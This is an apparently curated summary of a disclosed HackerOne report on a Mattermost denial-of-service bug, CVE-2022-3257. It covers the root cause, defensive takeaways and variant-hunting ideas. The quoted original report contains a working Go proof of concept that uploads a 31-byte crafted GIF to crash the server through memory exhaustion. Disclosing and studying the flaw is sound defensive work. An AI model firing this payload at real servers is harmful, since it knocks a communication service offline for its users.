# Denial of Service via Out-of-Memory from Malicious GIF Upload

## Metadata
- **Source:** HackerOne
- **Report:** 1620170 | https://hackerone.com/reports/1620170
- **Submitted:** 2022-06-30
- **Reporter:** catenacyber
- **Program:** Mattermost
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Denial of Service, Out-of-Memory, Resource Exhaustion, Improper Input Validation
- **CVEs:** CVE-2022-3257
- **Category:** memory-binary

## Summary
A specially crafted GIF file uploaded through the Mattermost upload API can cause the server to consume excessive memory (>4GB) and crash. The vulnerability exists because the upload API endpoint does not preprocess/validate image dimensions before calling gif.DecodeAll(), unlike the v4 files API route which has proper safeguards.

## Attack scenario
1. Attacker identifies Mattermost instance with standard 4GB memory allocation
2. Attacker crafts a malicious GIF file with extremely large declared dimensions (0xfff8 x 0xffff pixels)
3. Attacker authenticates to a valid channel or obtains upload credentials
4. Attacker sends CreateUploadSession request with malicious GIF metadata
5. Attacker uploads the GIF data triggering GetInfoForBytes → gif.DecodeAll()
6. Server attempts to decode entire image buffer, consuming all available RAM, triggering OOM killer and container shutdown

## Root cause
The upload API endpoint (/api/v4/files or equivalent) calls App.UploadData → doUploadData → uploadData → GetInfoForBytes → gif.DecodeAll() without first validating image dimensions via preprocessImage(). The gif.DecodeAll() function decodes all frames into memory without dimension checks, allowing a file with header declaring 65528x65535 pixel dimensions to exhaust memory regardless of actual file size.

## Attacker mindset
Attacker seeks to perform denial-of-service against a collaborative communication platform. The attack requires minimal effort (simple POC), low authentication requirements (valid user credentials), and has immediate server-crashing impact. This represents a low-effort, high-impact availability attack.

## Defensive takeaways
- Implement mandatory image dimension validation before decoding any image format
- Apply consistent preprocessing and validation across all upload endpoints (api/v4/files and upload session APIs should use identical safeguards)
- Set memory limits or streaming decoders for image processing to prevent full in-memory decoding
- Validate image header claims against actual file size and decoded content
- Implement rate limiting on upload endpoints per user/channel
- Add resource quotas for image decoding operations (timeout, memory ceiling)
- Use container memory limits and monitor OOM killer events as detection mechanism

## Variant hunting
Test other image formats (PNG, JPEG, WebP) through upload session API for similar OOM issues
Check if svg.DecodeAll or other format decoders have identical vulnerability
Verify if other authenticated endpoints accepting binary data (avatar uploads, emoji uploads) have same preprocessing gaps
Test with other extreme dimensions in different combinations (e.g., 1x65535, 65535x1)
Check if authenticated users can trigger OOM on other media processing endpoints
Look for similar preprocessImage gaps in video processing pipeline if supported

## MITRE ATT&CK
- T1190
- T1499.4
- T1561.2

## Notes
Report demonstrates excellent security research methodology with clear POC and root cause analysis. The vulnerability highlights the importance of consistent security controls across API versions - the v4 files route had the fix (preprocessImage) but upload session route lacked it. Mattermost's hardware documentation claiming 4GB sufficient for team deployments becomes irrelevant when single malicious upload can exhaust all memory. GIF format selection by attacker likely deliberate as it supports animation frames, making DecodeAll() particularly dangerous.

## Full report
<details><summary>Expand</summary>

## Summary:
When sending a specially crafted gif with max dimensions through the upload API, we get Mattermost server to consume more than 4Gbytes of RAM

## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. Run `docker run --name mattermost-preview -d --publish 8065:8065 mattermost/mattermost-preview -m=4G` as documented https://docs.mattermost.com/guides/deployment.html with 4G limit from https://docs.mattermost.com/install/software-hardware-requirements.html#hardware-requirements-for-team-deployments
  1. Get one channel id
  1. Run this simple POC below with a valid channel id
  1. Docker container gets killed

```
package main

import (
	"bytes"
	"fmt"
	"github.com/mattermost/mattermost-server/v5/model"
)

func main() {
	Client := model.NewAPIv4Client("http://localhost:8065/")
	Client.Login("toto", "tototo")
	us := &model.UploadSession{
		ChannelId: "5dtj9hf89ifap8imigbzjc7wjo",
		Filename:  "oom.gif",
		FileSize:  31,
	}
	us, response := Client.CreateUpload(us)
	fmt.Printf("lol %s %#+v\n", us, response)
	data := []byte{0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x2e, 0xf8, 0xff, 0xff, 0xf, 0x18, 0x18, 0x2c, 0x7f, 0x20, 0x0, 0x0, 0x0, 0xa0, 0xff, 0xff, 0xff, 0xd4, 0x9a, 0xf0, 0xb4, 0x8, 0x35, 0x4, 0x0}
	info, err2 := Client.UploadData(us.Id, bytes.NewReader(data))
	fmt.Printf("lol %s %#+v\n", err2, info)
}
```

This happens with `gif.DecodeAll` being called by `GetInfoForBytes` getting called by `App.UploadData` being called by `doUploadData` being called by `uploadData` without any call to `preprocessImage` as is done in the `api/v4/files` route

Docker container gets killed

## Impact

Crash a server

</details>

---
*Analysed by Claude on 2026-05-24*
